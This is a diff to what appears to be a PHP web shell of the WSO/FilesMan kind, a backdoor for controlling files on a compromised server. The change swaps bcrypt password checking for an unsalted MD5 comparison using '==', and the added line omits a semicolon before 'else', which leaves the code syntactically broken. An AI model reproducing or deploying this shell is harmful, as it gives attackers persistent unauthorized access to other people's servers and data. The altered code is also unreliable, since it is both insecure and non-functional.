@@ -10,7 +10,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password 			= "$2y$10$5cSEil7MBDmc7x1IbnCHF.SQvByGqNVO1tQ2mfYiw3wxE96R9X0ve";   
+$password 			= "8a388234672bc6afd1f2a16fc248f8ff";   
 $color 				= "#00ff00";
 $default_action 	= 'FilesMan';
 $default_use_ajax 	= true;
@@ -145,8 +145,8 @@ function login_shell() {
 exit;
 }
 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-if (empty($password) || (isset($_POST['pass']) && password_verify($_POST['pass'], $password))) {
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+if( empty($password) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $password) ) )
+	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true
 else
 login_shell();
 if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
